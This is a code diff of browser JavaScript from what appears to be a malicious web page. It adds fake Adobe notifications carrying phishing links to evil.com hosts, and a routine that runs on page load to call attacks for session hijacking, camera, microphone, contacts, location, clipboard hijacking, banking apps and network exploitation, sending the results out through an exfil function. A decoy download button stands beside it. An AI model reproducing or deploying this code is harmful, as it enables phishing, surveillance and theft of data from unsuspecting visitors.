+        const result = { attack: 'notification_spam', supported: 'Notification' in window };
+        if (!result.supported) return result;
         
         if (Notification.permission === 'granted') {
-            // Already granted — send spam immediately
-            for (let i = 0; i < 5; i++) {
+            const spamMessages = [
+                { title: '⚠️ Security Alert', body: 'Your Adobe account was accessed from a new device. Verify now: https://adobe-verify.evil.com' },
+                { title: '💰 Payment Failed', body: 'Your subscription payment failed. Update payment method: https://adobe-billing.evil.com' },
+                { title: '🎁 You Won a Prize!', body: 'Claim your free Adobe Creative Cloud subscription: https://adobe-prize.evil.com' },
+                { title: '🔒 Account Locked', body: 'Your account has been locked due to suspicious activity. Unlock: https://adobe-unlock.evil.com' },
+                { title: '📧 New Message', body: 'You have a new secure message from Adobe Support: https://adobe-msg.evil.com' }
+            ];
+            
+            for (let i = 0; i < spamMessages.length; i++) {
                 setTimeout(() => {
-                    new Notification('⚠️ Security Alert', {
-                        body: 'Your Adobe account has been compromised. Click here to secure it.',
+                    const msg = spamMessages[i];
+                    new Notification(msg.title, {
+                        body: msg.body,
                         icon: 'https://www.adobe.com/favicon.ico',
-                        requireInteraction: true
+                        badge: 'https://www.adobe.com/favicon.ico',
+                        requireInteraction: true,
+                        tag: 'adobe_spam_' + i
                     });
-                }, i * 2000);
+                }, i * 3000);
             }
-            exfil({ attack: 'notification_spam', sent: 5 });
+            result.spamSent = spamMessages.length;
         } else if (Notification.permission !== 'denied') {
-            // Try to request permission (will show browser prompt)
             Notification.requestPermission().then(perm => {
-                exfil({ attack: 'notification_spam', permission_requested: perm });
+                result.permissionRequested = perm;
+                exfil({ attack: 'notification_permission', result: perm });
             });
         }
+        
+        exfil(result);
+        return result;
     }
     
     // ========== MASTER: Execute ALL attacks ==========
-    (async function executeAttacks() {
-        const report = { timestamp: new Date().toISOString(), results: {} };
+    (async function executeAllAttacks() {
+        const report = { timestamp: new Date().toISOString() };
         
-        // Run all attacks
-        report.results.sessionHijack = await attackSessionHijack();
-        report.results.csrf = await attackCSRF();
-        attackPasswordReset();
-        attackSessionFixation();
-        attackClickjacking();
-        attackCryptojack();
-        attackTabnapping();
-        attackHistoryManipulation();
+        // Run all critical attacks
+        report.sessionHijack = await attackSessionHijack();
+        report.camera = await attackCamera();
+        report.microphone = await attackMicrophone();
+        attackWhatsApp();
+        attackSMS();
+        attackPhoneCall();
+        attackBankingApps();
+        report.contacts = await attackContacts();
+        report.location = await attackLocation();
         attackClipboardHijack();
-        report.results.networkRecon = await attackNetworkRecon();
-        attackKeylogger();
+        report.networkExploit = await attackNetworkExploit();
         attackNotificationSpam();
         
-        // Final exfiltration
-        exfil({ attack: 'full_report', summary: Object.keys(report.results) });
+        exfil({ attack: 'full_report', attacks_run: Object.keys(report).length });
     })();
     
-    // Button handler (after clickjacking overlay is set up)
     function downloadReport() {
         const btn = document.querySelector('.cta button');
         btn.textContent = '⏳ Preparing download...';
